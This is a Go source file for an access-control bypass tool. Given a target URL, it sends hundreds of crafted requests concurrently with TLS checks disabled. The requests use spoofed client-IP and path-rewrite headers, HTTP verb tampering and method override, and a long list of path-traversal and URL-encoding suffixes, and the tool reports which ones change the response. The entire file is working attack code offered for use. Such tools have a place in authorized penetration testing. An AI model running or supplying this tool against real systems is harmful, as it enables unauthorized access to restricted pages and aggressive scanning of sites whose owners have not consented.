package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type BypassResult struct {
	Payload    string `json:"payload"`
	Method     string `json:"method"`
	StatusCode int    `json:"status_code"`
	Length     int    `json:"length"`
}

type Payload struct {
	Type         string
	Header       map[string]string
	Method       string
	Suffix       string
	PathOverride string
}

func main() {
	targetURL := flag.String("url", "", "Target URL (e.g., https://example.com/admin)")
	flag.Parse()

	if *targetURL == "" {
		fmt.Println(`{"error": "Target URL is required"}`)
		return
	}

	u, err := url.Parse(*targetURL)
	if err != nil {
		fmt.Printf(`{"error": "Invalid URL: %v"}`+"\n", err)
		return
	}

	domain := u.Host
	path := u.Path
	if path == "" {
		path = "/"
	}

	payloads := generatePayloads(domain, path)
	results := runBypasses(*targetURL, payloads)

	out, _ := json.Marshal(results)
	fmt.Println(string(out))
}

func generatePayloads(domain, path string) []Payload {
	var p []Payload

	// ==========================================
	// 1. HEADER BYPASSES (IP Spoofing)
	// ==========================================
	ipPayloads := []string{
		"127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "127.0.1",
		"2130706433", "0x7F000001", "0177.0000.0000.0001",
		"127.0.0.1:80", "127.0.0.1:443",
		"127.0.0.1, 68.180.194.242", "127.0.0.1, 127.0.0.1",
		"8.8.8.8", "10.0.0.1", "192.168.0.1",
		"::1", "0:0:0:0:0:0:0:1", "[::1]",
	}
	
	headerKeys := []string{
		"X-Originally-Forwarded-For",
		"X-Originating-IP",
		"X-Originating-",
		"True-Client-IP",
		"X-WAP-Profile",
		"X-Forwarded-For",
		"X-Forwarded",
		"Forwarded-For",
		"Forwarded",
		"X-Forwarded-Host",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Client-IP",
		"X-Host",
		"X-Custom-IP-Authorization",
		"Client-IP",
		"Cluster-Client-IP",
		"X-Real-IP",
		"X-Originating-Host",
		"Host",
		"CF-Connecting-IP",
		"X-Forwarded-For-Original",
		"X-Envoy-External-Address",
		"X-CDN-IP",
		"X-Edge-IP",
		"X-Orig-IP",
	}

	for _, ip := range ipPayloads {
		for _, key := range headerKeys {
			p = append(p, Payload{Type: "Header Injection", Header: map[string]string{key: ip}, Method: "GET"})
		}
	}

	// ==========================================
	// 2. HEADER BYPASSES (Profile & Arbitrary)
	// ==========================================
	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"Profile": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"X-Arbitrary": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Header Injection", Header: map[string]string{"Profile": "http://127.0.0.1"}, Method: "GET"})

	// ==========================================
	// 3. HEADER BYPASSES (Path Rewrite & Proxy)
	// ==========================================
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URL": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Rewrite-URL": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Original-URI": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-Request-URI": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-URI": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-URL": path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"X-HTTP-DestinationURL": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite", Header: map[string]string{"Destination": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
	
	// Proxy & Routing Headers
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"X-Proxy-Url": "http://127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy": "http://127.0.0.1:8080"}, Method: "GET"})
	p = append(p, Payload{Type: "Proxy Spoofing", Header: map[string]string{"Proxy-Host": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Original-Host": domain}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Server": "localhost"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Backend-Host": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Routing Spoofing", Header: map[string]string{"X-Forwarded-Server": domain}, Method: "GET"})
	
	// Protocol & Port Spoofing
	for _, proto := range []string{"http", "https", "http/1.1", "https/1.3", "http/2.0"} {
		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-Forwarded-Proto": proto}, Method: "GET"})
		p = append(p, Payload{Type: "Protocol Spoofing", Header: map[string]string{"X-Forwarded-Scheme": proto}, Method: "GET"})
	}
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "443"}, Method: "GET"})
	p = append(p, Payload{Type: "Port Spoofing", Header: map[string]string{"X-Forwarded-Port": "80"}, Method: "GET"})

	// Specific Misc Headers
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Request-ID": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Request-Id": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"X-Requested-With": "XMLHttpRequest"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"Via": "1.1 google"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc Spoofing", Header: map[string]string{"Via": "1.0 proxy.local"}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Referer": "http://" + domain + path}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Referrer": "http://127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoofing", Header: map[string]string{"Origin": "http://" + domain}, Method: "GET"})

	// User-Agent Spoofing
	uas := []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"curl/7.68.0",
	}
	for _, ua := range uas {
		p = append(p, Payload{Type: "User-Agent Spoofing", Header: map[string]string{"User-Agent": ua}, Method: "GET"})
	}

	// ==========================================
	// 4. HTTP METHOD BYPASSES (Verb Tampering & Method Override)
	// ==========================================
	methods := []string{
		"TRACE", "POST", "PUT", "OPTIONS", "PATCH", "INVENTED", "HACK", "DELETE", "CONNECT",
		"HEAD", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
		"PURGE", "BIND", "REBIND", "UNBIND", "ACL", "REPORT", "SEARCH",
	}
	for _, m := range methods {
		p = append(p, Payload{Type: "Verb Tampering", Method: m})
	}

	// Method Override Spoofing
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "POST"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "GET"}, Method: "POST"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "PUT"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method-Override": "PATCH"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-HTTP-Method": "POST"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override", Header: map[string]string{"X-Method-Override": "POST"}, Method: "GET"})

	// ==========================================
	// 5. PATH SUFFIX & URL ENCODING FUZZING
	// ==========================================
	suffixes := []string{
		"%2e/", "/.", "//", "./", "/./", "%20", "%09", "?", ".html", "/*", "/..;/", 
		"~", ".json", ".xml", ".php", ".txt", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
		"?", "??", "&", "#", "%", "%20/", "%00", ".swp", ".bak", "~1", ".ext", 
		"//%2e%2e/", "/%20%23", "/%2e%2e", "/..%3b/", "/.;/", "/;/", "/..%00/",
		"#?", "%09%3b", "%09..", "%09;", "%23%3f", "%252f%252f", "%252f/", "%2e%2e", "%2f",
		"%2f%20%23", "%2f%23", "%2f%2f", "%2f%3b%2f", "%2f%3b%2f%2f", "%2f%3f", "%2f%3f/",
		"%2f/", "%3b", "%3b%09", "%3b%2f%2e%2e", "%3b%2f%2e%2e%2f%2e%2e%2f%2f", "%3b%2f%2e.",
		"%3b%2f..", "%3b/%2e%2e/..%2f%2f", "%3b/%2e.", "%3b/%2f%2f../", "%3b/..", "%3b//%2f../",
		"%3f%23", "%3f%3f", "..", "..%00/;", "..%00;/", "..%09", "..%0d/;", "..%0d;/", "..%5c/",
		"..%ff/;", "..%ff;/", "..;%00/", "..;%0d/", "..;%ff/", "..;\\", "..;\\;", "..\\;",
		"/%20#", "/%20%23", "/%252e%252e%252f/", "/%252e%252e%253b/", "/%252e%252f/", "/%252e%253b/",
		"/%252e/", "/%252f", "/%2e%2e", "/%2e%2e%3b/", "/%2e%2e/", "/%2e%2f/", "/%2e%3b/",
		"/%2e%3b//", "/%2e/", "/%2e//", "/%2f", "/%3b/", "/..", "/..%2f", "/..%2f..%2f",
		"/..%2f..%2f..%2f", "/../", "/../../", "/../../../", "/../../..//", "/../..//",
		"/../..//../", "/../..;/", "/.././../", "/../.;/../", "/..//", "/..//../", "/..//../../",
		"/..//..;/", "/../;/", "/../;/../", "/..;%2f", "/..;%2f..;%2f", "/..;%2f..;%2f..;%2f",
		"/..;/../", "/..;/..;/", "/..;//", "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/",
		"/.//", "/.;/", "/.;//", "//..", "//../../", "//..;", "//..;", "//./", "//.;/", "///..",
		"///../", "///..//", "///..;", "///..;/", "///..;//", "//;/", "/;/", "/;//", "/;x",
		"/;x/", "/x/../", "/x/..//", "/x/../;/", "/x/..;/", "/x/..;//", "/x/..;/;/", "/x//../",
		"/x//..;/", "/x/;/../", "/x/;/..;/", ";", ";%09", ";%09..", ";%09..;", ";%09;", ";%2F..",
		";%2f%2e%2e", ";%2f%2e%2e%2f%2e%2e%2f%2f", ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
		";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f", ";%2f..%2f/../",
	}
	for _, s := range suffixes {
		p = append(p, Payload{Type: "Path Suffix Fuzzing", Method: "GET", Suffix: s})
	}

	// ==========================================
	// 6. PATH PREFIX / MID-PATH FUZZING
	// ==========================================
	if len(path) > 1 {
		pathParts := strings.Split(strings.TrimPrefix(path, "/"), "/")
		firstDir := pathParts[0]
		restPath := "/" + strings.Join(pathParts[1:], "/")
		if restPath == "/" { restPath = "" }
		
		prefixes := []string{
			"/%2e/", "/%ef%bc%8f/", "/./", "//", "/%20", "/%09", "/%00",
			"/..;/", "/%2e%2e%2f", "/.;/", "/;/", "/..%00/", "/..%0d/", "/..%5c/", "/..%2f/",
		}

		for _, pref := range prefixes {
			p = append(p, Payload{Type: "Path Prefix Fuzzing", Method: "GET", PathOverride: pref + firstDir + restPath})
			// Also try uppercase conversion for case-sensitive bypasses
			p = append(p, Payload{Type: "Case Toggling Fuzz", Method: "GET", PathOverride: "/" + strings.ToUpper(firstDir) + restPath})
		}
	}

	return p
}

func runBypasses(target string, payloads []Payload) []BypassResult {
	var results []BypassResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Aggressive concurrency pool (100 workers)
	sem := make(chan struct{}, 100)

	for _, p := range payloads {
		wg.Add(1)
		sem <- struct{}{}

		go func(pl Payload) {
			defer wg.Done()
			defer func() { <-sem }()

			// Construct Request URL
			reqURL := target
			if pl.PathOverride != "" {
				// We do a naive string replacement to preserve exact characters like %2e which url.Parse might decode
				// Find where the path starts in the target string
				u, err := url.Parse(target)
				if err == nil {
				    // Rebuild URL manually to prevent Go from normalizing the path
				    portStr := ""
				    if u.Port() != "" {
				        portStr = ":" + u.Port()
				    }
				    reqURL = fmt.Sprintf("%s://%s%s%s", u.Scheme, u.Hostname(), portStr, pl.PathOverride)
				}
			} else if pl.Suffix != "" {
				reqURL = strings.TrimSuffix(reqURL, "/") + pl.Suffix
			}

			method := pl.Method
			if method == "" {
				method = "GET"
			}

			req, err := http.NewRequest(method, reqURL, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

			headerDesc := ""
			if pl.Header != nil {
				for k, v := range pl.Header {
					req.Header.Set(k, v)
					headerDesc += fmt.Sprintf("%s: %s ", k, v)
				}
			}

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			desc := pl.Type
			if headerDesc != "" {
				desc += " [" + strings.TrimSpace(headerDesc) + "]"
			}
			if pl.PathOverride != "" {
				desc += " [Path: " + pl.PathOverride + "]"
			} else if pl.Suffix != "" {
				desc += " [Suffix: " + pl.Suffix + "]"
			}

			mu.Lock()
			results = append(results, BypassResult{
				Payload:    desc,
				Method:     method,
				StatusCode: resp.StatusCode,
				Length:     int(resp.ContentLength),
			})
			mu.Unlock()

		}(p)
	}

	wg.Wait()
	return results
}
